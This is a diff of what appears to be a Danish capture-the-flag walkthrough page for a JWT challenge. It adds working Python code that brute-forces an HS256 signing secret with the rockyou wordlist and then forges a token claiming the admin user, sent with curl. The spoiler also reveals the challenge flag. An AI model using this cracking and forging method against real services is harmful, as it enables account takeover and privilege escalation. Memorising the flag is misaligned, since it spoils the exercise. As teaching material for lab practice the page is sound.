@@ -25,14 +25,32 @@
 <h2>Hvad går opgaven ud på?</h2>
 <p>Login sætter en <code>jwt</code>-cookie med <code>{"user":"guest"}</code> (HS256). Hintet
              ("JohnTheRipper") = knæk secret'en med en wordlist, så kan du forge vilkårlige claims.</p>
-<h2>Trin for trin</h2>
-<pre><code># knæk secret (HMAC-SHA256 over header.payload, sammenlign med signaturen) -> 'challenge'
-# forge {"user":"admin"} signeret med den:
-h=b64u(b'{"alg":"HS256","typ":"JWT"}'); p=b64u(b'{"user":"admin"}')
-tok=f"{h}.{p}."+b64u(hmac.new(b'challenge',(h+'.'+p).encode(),hashlib.sha256).digest())
-curl -b "jwt=$tok" http://jwt.com/user</code></pre>
-             <p>Genberegn med <em>samme</em> serialisering (ingen mellemrum). Alternativt <code>hashcat -m 16500</code>
-             eller <code>jwt_tool</code>.</p>
+<h2>Knæk secret&#x27;en</h2>
+<p>Tag <code>header.payload</code>-delen af din egen (gæste-)token og den signatur du fik, og
+             prøv rockyou mod HMAC-SHA256 indtil den matcher:</p>
+             <pre><code>python3 -c "
+import hmac, hashlib, base64
+b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+si = b'&lt;header&gt;.&lt;payload&gt;'   # de to første dot-separerede dele af din egen jwt-cookie
+sig = '&lt;signature&gt;'               # den tredje del
+for w in open('rockyou.txt', 'rb'):
+    w = w.rstrip(b'\n')
+    if b64u(hmac.new(w, si, hashlib.sha256).digest()) == sig:
+        print(w); break"
+# -> secret'en (fx 'challenge')</code></pre>
+             <p>Alternativt <code>hashcat -m 16500</code> eller <code>jwt_tool</code> hvis du foretrækker et
+             færdigt værktøj.</p>
+<h2>Forge admin-claims</h2>
+<pre><code>python3 -c "
+import hmac, hashlib, base64
+b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+h = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')
+p = b64u(b'{\"user\":\"admin\"}')
+sig = b64u(hmac.new(b'challenge', (h+'.'+p).encode(), hashlib.sha256).digest())
+print(f'{h}.{p}.{sig}')"
+curl -b "jwt=&lt;token-fra-ovenstående&gt;" http://jwt.com/user</code></pre>
+             <p>Genberegn med <em>samme</em> serialisering som originalen (ingen mellemrum i JSON'en), ellers
+             matcher signaturen ikke.</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{Pi5-JHo-VT2Z}</span></p>
 </details>
